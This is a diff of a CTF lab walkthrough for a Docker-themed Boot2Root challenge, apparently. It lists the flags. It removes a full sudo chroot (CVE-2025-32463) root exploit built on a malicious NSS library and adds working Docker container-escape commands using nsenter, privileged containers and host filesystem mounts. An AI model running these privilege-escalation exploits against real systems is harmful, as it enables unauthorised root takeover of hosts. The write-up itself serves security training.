@@ -3,13 +3,13 @@
 ## Challenge Overview
 Moby Dock is a Boot2Root challenge featuring three stages of exploitation:
 1. **Initial Access**: Docker API Exploitation (SSRF or Direct API Access)
-2. **User Privilege**: Docker Container Escape
-3. **Root Privilege**: CVE-2025-32463 (Sudo Chroot Vulnerability)
+2. **User Privilege**: Docker Container Escape  
+3. **Root Privilege**: Docker Privilege Escalation (nsenter + PID namespace sharing)
 
 ## Flags
 - **flag1.txt**: `H7CTF{d0ck3r_4p1_3xp0s3d_w1th0ut_4uth_1s_d34dly_d4ng3r0us}` (Container)
 - **flag2.txt**: `H7CTF{c0nt41n3r_br34k0ut_pr1v1l3g3d_3sc4p3_t0_h0st_succ3ssful}` (User)
-- **flag3.txt**: `H7CTF{r00t_4cc3ss_4ch13v3d_cve_2025_32463}` (Root)
+- **flag3.txt**: `H7CTF{d0ck3r_esc4p3_v1a_n4m3sp4c3_sh4r1ng_and_nsent3r}` (Root)
 
 ---
 
@@ -235,74 +235,125 @@ cat /home/abu/flag2.txt
 
 ---
 
-## Stage 3: Privilege Escalation via CVE-2025-32463
+## Stage 3: Privilege Escalation via Docker
 
-### Step 3.1: Check Sudo Version
+### Step 3.1: Enumerate User Privileges
 ```bash
-sudo --version
-# Should show: Sudo version 1.9.15p2 (or 1.9.14 - 1.9.17)
+# Check what groups you're in
+id
+groups
+
+# Output should show:
+# abu docker
+
+# This is the key - docker group membership!
 ```
 
-### Step 3.2: CVE-2025-32463 Exploit
+### Step 3.2: Explore Docker Access
 ```bash
-#!/bin/bash
-# exploit_sudo_chroot.sh - CVE-2025-32463 PoC
+# Check Docker access
+docker ps
 
-set -e
+# List available images
+docker images
+# Output:
+# REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+# alpine       latest    xxx            2 weeks ago   7.73MB
+# busybox      latest    xxx            2 weeks ago   4.26MB
 
-STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
-cd "$STAGE"
-
-echo "[*] Creating exploit in $STAGE..."
-
-# 1. Create malicious NSS library
-cat > woot1337.c <<'EOF'
-#include <stdlib.h>
-#include <unistd.h>
-
-__attribute__((constructor))
-void woot(void) {
-    setreuid(0,0);          /* change to UID 0 */
-    setregid(0,0);          /* change to GID 0 */
-    chdir("/");             /* exit from chroot */
-    execl("/bin/bash","/bin/bash",NULL); /* root shell */
-}
-EOF
-
-# 2. Create mini chroot with malicious nsswitch.conf
-mkdir -p woot/etc libnss_
-echo "passwd: /woot1337" > woot/etc/nsswitch.conf
-cp /etc/group woot/etc 2>/dev/null || echo "root:x:0:" > woot/etc/group
-
-# 3. Compile malicious library
-gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
-
-echo "[*] Exploit prepared!"
-echo "[*] Running: sudo -R woot woot"
-echo "[*] Attempting privilege escalation..."
-
-# Execute exploit
-sudo -R woot woot
-
-# Cleanup on failure
-cd /
-rm -rf "$STAGE"
+# Check if you can run containers
+docker run --rm alpine echo "Docker access confirmed"
 ```
 
-### Step 3.3: Execute Exploit
+### Step 3.3: Docker Privilege Escalation - nsenter Technique
+
+**Understanding the Technique:**
+
+Linux containers use **namespaces** for isolation. Docker allows containers to share the host's PID namespace with `--pid=host`. Combined with the `nsenter` tool, we can "jump" from the container into the host's context.
+
+**Key Concepts:**
+- **PID Namespace**: Isolates process IDs. With `--pid=host`, container sees ALL host processes
+- **nsenter**: Tool to enter another process's namespaces
+- **CAP_SYS_ADMIN**: Capability needed to manipulate namespaces
+- **PID 1**: The init/systemd process on the host
+
+**The Attack Chain:**
+```
+1. Create container with host PID namespace (--pid=host)
+2. Add SYS_ADMIN capability (--cap-add=SYS_ADMIN)
+3. Use nsenter to enter PID 1's namespaces
+4. Result: Root shell on host!
+```
+
+### Step 3.4: Execute the Exploit
+
+**Method 1: Using the automated script**
 ```bash
-# Make executable
-chmod +x exploit_sudo_chroot.sh
+cd ~
+chmod +x /vagrant/exploits/docker_nsenter_privesc.sh
+/vagrant/exploits/docker_nsenter_privesc.sh
+```
 
-# Run exploit
-./exploit_sudo_chroot.sh
+**Method 2: Manual exploitation (recommended for learning)**
 
-# You should get a root shell!
+```bash
+# Step 1: Create privileged container with host PID namespace
+docker run --rm -it --pid=host --privileged alpine sh
+
+# Step 2: Inside the container, use nsenter to enter host's namespaces
+nsenter --target 1 --mount --uts --ipc --net /bin/sh
+
+# Step 3: Verify you're on the host
 whoami  # root
+hostname  # mobydock
+```
+
+**One-Liner (Recommended):**
+```bash
+docker run --rm -it --pid=host --privileged alpine \
+  nsenter --target 1 --mount --uts --ipc --net /bin/sh
+```
+
+### Step 3.5: Understanding the Attack
+
+**Command Breakdown:**
+- `--pid=host`: Share host's PID namespace (see all host processes)
+- `--privileged`: Grant ALL capabilities (including SYS_ADMIN, SYS_PTRACE)
+- `nsenter --target 1`: Enter PID 1's (host init) namespaces
+- Result: Root shell on host!
+
+**Why It Works:**
+1. Docker group = effectively root access
+2. `--pid=host` breaks container isolation
+3. `nsenter` lets you "jump" from container to host context
+4. You're now root on the host system! 🎉
+
+### Step 3.6: Get the Final Flag
+```bash
+# Check privileges
+whoami  # root
+id      # uid=0(root) gid=0(root)
 
 # Get final flag
 cat /root/flag3.txt
-# Flag: H7CTF{r00t_4cc3ss_4ch13v3d_cve_2025_32463}
+# Flag: H7CTF{d0ck3r_esc4p3_v1a_n4m3sp4c3_sh4r1ng_and_nsent3r}
+
+# Celebrate!
+echo "Challenge Complete! All flags captured!"
+```
+
+### Alternative Docker Escape Methods
+
+**Method A: Simple Volume Mount (Easier)**
+```bash
+docker run -v /:/hostfs --rm -it alpine chroot /hostfs bash
+cat /root/flag3.txt
+```
+
+**Method B: Privileged Container**
+```bash
+docker run --privileged --rm -it alpine
+mkdir /host && mount /dev/sda1 /host && chroot /host
 ```
 
 ---
